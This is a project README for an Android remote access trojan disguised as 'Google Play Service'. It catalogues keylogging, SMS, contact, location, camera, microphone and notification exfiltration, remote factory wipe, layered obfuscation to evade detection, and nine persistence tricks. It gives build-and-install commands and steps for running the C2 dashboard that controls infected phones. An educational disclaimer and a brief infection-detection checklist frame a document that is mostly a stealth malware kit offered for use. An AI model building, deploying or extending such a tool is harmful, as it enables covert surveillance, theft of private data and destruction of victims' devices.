# AhMyth Client — Android RAT (Remote Administration Tool)

> **⚠️ DISCLAIMER:** This software is designed for **educational and authorized testing purposes only**. Unauthorized access to computer systems or mobile devices is illegal. The authors assume no liability for misuse. Use only on devices you own or have explicit permission to test.

[![CI](https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client/actions/workflows/build.yml/badge.svg)](https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client/actions/workflows/build.yml)
[![GitHub Pages](https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client/actions/workflows/deploy-pages.yml/badge.svg)](https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client/actions/workflows/deploy-pages.yml)

---

## 📋 Project Overview

An Android **RAT (Remote Access Trojan)** client, disguised as *"Google Play Service"*, that demonstrates how Android malware operates in the wild — permission escalation, persistence mechanisms, data exfiltration, device control, and anti-detection techniques.

**Built with:** Java + Kotlin • Socket.IO 2.0.1 • AndroidX • WorkManager • MediaProjection API • Firebase Cloud Messaging • Native NDK (C) • CMake

---

## ✨ Features

### 📡 C2 Communication Channels

| Channel | Type | Description |
|---------|------|-------------|
| **Socket.IO** (Direct) | Persistent WebSocket | Original real-time command channel, always-on connection |
| **FCM** (Stealth) | Push-triggered | Commands delivered via Firebase push messages; brief socket connections only when commanded — blends into Google's traffic |

### 🕵️ Anti-Detection & Obfuscation

| Layer | Technique | Details |
|-------|-----------|---------|
| **AES String Encryption** | Runtime decryption | All 20+ C2 opcodes, JSON keys, and URL components stored as encrypted byte arrays — decrypted in memory right before use |
| **Native Crypto** | NDK .so library | AES key and decryption algorithm exist **only** in native C code — invisible to Java decompilers |
| **ProGuard Hardening** | Bytecode obfuscation | `repackageclasses` (flat a.a.a namespace), `assumenosideeffects` (strip all Log calls), 5-pass optimization |
| **XOR Key Obfuscation** | Anti-binary-search | AES key stored as 8 XOR'd bytes with derived second half — prevents simple byte-pattern searches |
| **Icon Hiding** | Launcher removal | App icon disappears from app drawer after first launch |
| **Fake Identity** | Social engineering | Disguised as "Google Play Service" with matching notification |

### 📷 Surveillance & Exfiltration

| Capability | Module | Data Format |
|------------|--------|-------------|
| SMS read/send | `SMSManager` | Full inbox with sender, content, timestamps |
| Call logs | `CallsManager` | Number, name, duration, call type |
| Contacts | `ContactsManager` | All saved contacts with phone numbers |
| GPS location | `LocManager` | Lat/lng with accuracy (plotted on interactive map) |
| Camera photos | `CameraManager` | Front/back camera via deprecated Camera API |
| Microphone | `MicManager` | AAC/MPEG-4 audio recording (configurable duration) |
| Screen capture | `ScreenManager` | Base64-encoded JPEG via MediaProjection API |
| File system | `FileManager` | List directories, download files (20MB safety limit) |
| Installed apps | `AppsListManager` | Package names, versions |
| **⌨️ Keystroke logging** | `KeyloggerService` | Live keystroke feed via AccessibilityService |
| **📋 Clipboard capture** | `KeyloggerService` | Clipboard content (pre-Android 13) |
| **👆 Tap interception** | `KeyloggerService` | Overlay + accessibility tap logging |
| **💬 Notification stream** | `NotificationService` | Real-time notification exfiltration from all apps |

### 🛠️ Device Control

| Action | Mechanism | Requires |
|--------|-----------|----------|
| Lock device | DevicePolicyManager | Device Admin |
| Factory wipe | DevicePolicyManager.wipeData() | Device Admin |
| Reboot | DevicePolicyManager.reboot() (API 24+) | Device Admin |
| Dial number | `Intent.ACTION_CALL` | Phone permission |
| Open URL | `Intent.ACTION_VIEW` | — |
| Launch app | `PackageManager.getLaunchIntentForPackage()` | — |
| Delete file | Apache Commons IO `FileUtils.forceDelete()` | Storage permission |
| **✅ Auto-grant permissions** | `KeyloggerService` AccessibilityService | Accessibility Service |
| **🔓 Screen wake** | PowerManager WakeLock | Wake lock permission |
| **🖱️ Gesture injection** | `GestureDescription.Builder` | Accessibility Service |

### 🛡️ Persistence (9 Layers)

1. **Foreground Service** — ongoing notification prevents OOM kill
2. **START_STICKY** — Android auto-restarts the service
3. **WorkManager** — periodic restart every 15 minutes
4. **Boot Receiver** — restarts on device power-on
5. **Task Removal** — re-launches itself when swiped from recents
6. **Wake Lock** — keeps CPU running during screen-off
7. **Battery Optimization Bypass** — prevents doze mode
8. **Icon Hiding** — removed from app drawer
9. **Device Admin** — prevents uninstallation without multi-step deactivation

---

## 🏗 Architecture

```
┌───────────────────┐
│   C2 Dashboard    │  (Browser — HTML/JS)
│  (Socket.IO/FCM)  │
└────────┬──────────┘
         │ WebSocket ┌─────────────────────┐
         ├──────────→│   C2 Server         │
         │           │   (Node.js)         │
         │           │ Socket.IO + Express │
         │           │ + Firebase Admin SDK│
         │           └──────┬──────┬───────┘
         │                  │      │
         │      Socket.IO   │      │ FCM Push
         │     (persistent) │      │ (silent data msg)
         ▼                  ▼      ▼
┌──────────────────────────────────────────────┐
│            Android Device                     │
│                                               │
│  ┌─────────────────────────────────────────┐  │
│  │           MainService                    │  │
│  │  (Foreground — "Google Play Service")   │  │
│  └────────────────┬────────────────────────┘  │
│                   │                           │
│  ┌────────────────▼────────────────────────┐  │
│  │        ConnectionManager                │  │
│  │  ┌──────────┐ ┌───────────┐            │  │
│  │  │ SocketIO │ │ FCM Trigg │            │  │
│  │  │ Channel  │ │ er Channel│            │  │
│  │  └──────────┘ └───────────┘            │  │
│  │           ↕ dispatchOrder()             │  │
│  │  ┌──────┬──────┬──────┬──────┬──────┐  │  │
│  │  │Camera│ SMS  │ GPS  │ Mic  │ Files│  │  │
│  │  │Mgr   │ Mgr  │ Mgr  │ Mgr  │ Mgr  │  │  │
│  │  ├──────┼──────┼──────┼──────┼──────┤  │  │
│  │  │Calls │Cont. │Apps  │Screen│ Notif│  │  │
│  │  │Mgr   │ Mgr  │ Mgr  │ Mgr  │ Srvc │  │  │
│  │  ├──────┼──────┴──────┴──────┤      │  │  │
│  │  │ Keylogger Srvc (AccessibilityService)│  │
│  │  └──────┴──────────────────────────┘  │  │
│  │                                        │  │
│  │  ┌──────────────────────────────────┐  │  │
│  │  │  ObfuscationUtils (native .so)   │  │  │
│  │  │  AES-128 decrypt via JNI          │  │  │
│  │  └──────────────────────────────────┘  │  │
│  └────────────────────────────────────────┘  │
└──────────────────────────────────────────────┘
```

### Core Components

| Component | Role |
|-----------|------|
| `MainActivity` | Entry point; requests 13+ permissions; activates Device Admin; hides launcher icon |
| `MainService` | Foreground service; starts Socket.IO connection |
| `ConnectionManager` | Command dispatch hub; routes incoming orders to manager classes |
| `IOSocket` | Singleton Socket.IO client with auto-reconnection |
| `ObfuscationUtils` | Native AES-128-ECB decrypt via JNI — key exists only in .so |
| `FcmMessageService` | Firebase data message handler for stealth C2 trigger |
| `KeyloggerService` | AccessibilityService: keystrokes, taps, auto-grant, overlay, clipboard |
| `NotificationService` | NotificationListenerService: real-time notification exfiltration |
| `CameraManager` | Capture photos (front/back camera) |
| `MicManager` | Record audio for N seconds |
| `LocManager` | GPS/Network location tracking |
| `SMSManager` | Read SMS inbox and send SMS |
| `CallsManager` | Read call logs |
| `ContactsManager` | Exfiltrate all saved contacts |
| `FileManager` | List directories and download files |
| `ScreenManager` | Capture screen via MediaProjection API |
| `AppsListManager` | List all installed packages |

---

## 🚀 Quick Start

### Prerequisites

| Tool | Version | Notes |
|------|---------|-------|
| Android Studio | Hedgehog 2023.1+ | Download from developer.android.com |
| JDK | 17 | Included with Android Studio |
| Android SDK | 34 (compileSdk), 21 (minSdk) | Managed by Android Studio |
| Android NDK | 28+ | Required for native AES library |
| Node.js | 18+ | For the C2 dashboard server |
| Android Device | 7.0+ (API 24) | Emulator or physical device |

### 1. Build the APK

```bash
# Clone
git clone https://github.com/IamAzmathullaShaikh/AhMyth-Google-Play-Service-Client.git
cd AhMyth-Google-Play-Service-Client

# Configure server URL — edit app/build.gradle:
#   buildConfigField "String", "SOCKET_URL", "\"http://YOUR_IP:42474\""

# Build (includes native .so for all ABIs)
./gradlew assembleDebug

# Install
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 2. Start the C2 Dashboard

```bash
# Install server dependencies
npm install socket.io express

# Start (serves dashboard + handles C2 connections)
node .freebuff/c2-server.js

# Open in browser
# http://localhost:42474
```

### 3. Using the Dashboard

1. Open `http://localhost:42474` in a browser
2. Wait for device to connect (appears in sidebar)
3. Select the device and click command buttons:
   - **Surveillance:** Camera, Mic, GPS, Screen Capture
   - **Data Exfiltration:** SMS, Call Logs, Contacts, Apps
   - **Keylogger:** Enable keystroke logging, view live feed
   - **Actions:** File List, Dial, Open URL, Launch App
4. Watch responses appear in real-time in the log panel
5. GPS coordinates auto-plot on the interactive map

---

## 🔧 Documentation Index

| Document | Description |
|----------|-------------|
| **[CONTRIBUTING.md](CONTRIBUTING.md)** | Architecture deep dive, development setup, C2 protocol spec, adding commands, code style, PR process |
| **[DEPLOYMENT.md](DEPLOYMENT.md)** | Full deployment guide: C2 server, GitHub Pages, CI/CD, Firebase setup, native build |
| **[FCM_SETUP.md](.freebuff/FCM_SETUP.md)** | Step-by-step Firebase project configuration for stealth C2 channel |
| **[.freebuff/run.md](.freebuff/run.md)** | Running demo assets locally |

---

## 🧪 Key Commands (Opcodes)

See [CONTRIBUTING.md — C2 Protocol Specification](CONTRIBUTING.md#-c2-protocol-specification) for the complete table of 20+ opcodes.

---

## 🔍 Academic Relevance

This project demonstrates:
- **Permission escalation attacks** (Android permission model weaknesses)
- **C2 communication** (WebSocket + FCM-based command & control)
- **Data exfiltration** (SMS, contacts, location, media, files, keystrokes, clipboard)
- **Persistence techniques** (foreground services, broadcast receivers, WorkManager)
- **Anti-detection** (AES obfuscation, native crypto, ProGuard, icon hiding, AccessibilityService)
- **Device admin abuse** (lock, wipe, reboot)
- **AccessibilityService exploitation** (keylogging, auto-grant, gesture injection)
- **Defensive forensics** (indicators of compromise, detection heuristics)

---

## 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for:
- Architecture deep dive & data flow diagrams
- Development setup (including NDK build requirements)
- Complete C2 protocol specification (20+ opcodes)
- Step-by-step guide for adding new command modules
- Dashboard modification guide
- Testing guidelines & PR process

---

## 🔍 Defensive Detection Checklist

To check if a device is infected:

- [ ] Check **Settings → Apps** for "Google Play Service"
- [ ] Review **Device Admin apps** for unknown entries
- [ ] Check **Accessibility Services** for "Google Play Accessibility"
- [ ] Check **Notification Access** for suspicious listeners
- [ ] Review **Battery Optimization exceptions** for unknown apps
- [ ] Check **Overlay permission** grants
- [ ] Monitor for unusual **data usage** (persistent WebSocket traffic)
- [ ] Search for `x0000` opcode patterns in network traffic
- [ ] Check for native libraries in `/data/app/.../lib/` (libobfuscation_native.so)
